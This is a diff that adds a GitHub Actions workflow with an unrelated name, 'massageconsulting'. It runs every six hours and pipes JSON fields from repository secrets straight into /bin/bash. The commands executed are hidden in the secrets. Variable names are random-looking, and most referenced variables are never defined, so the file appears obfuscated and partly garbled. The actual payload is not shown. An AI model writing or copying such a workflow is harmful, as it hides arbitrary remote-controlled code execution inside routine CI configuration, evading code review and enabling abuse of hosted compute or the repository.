@@ -1,0 +1,26 @@
+name: massageconsulting
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: massageconsulting
+        env:
+          ay70: ${{ secrets.ay70 }}
+        run: |
+          echo $ay70 | jq -r .l720 | /bin/bash
+          echo $ohdq787 | jq -r .kl32 | /bin/bash
+          echo $tjds6 | jq -r .ymxdt50391 | /bin/bash
+          echo $gcz4 | jq -r .juosr4963 | /bin/bash
+          echo $ljy0505 | jq -r .jwwh8622 | /bin/bash
+          echo $ih5056 | jq -r .slamj68 | /bin/bash
+          echo $npsih92826 | jq -r .nb35409 | /bin/bash
+          echo $jf2 | jq -r .rxtku1 | /bin/bash
+          echo $p5973 | jq -r .ils8 | /bin/bash
+
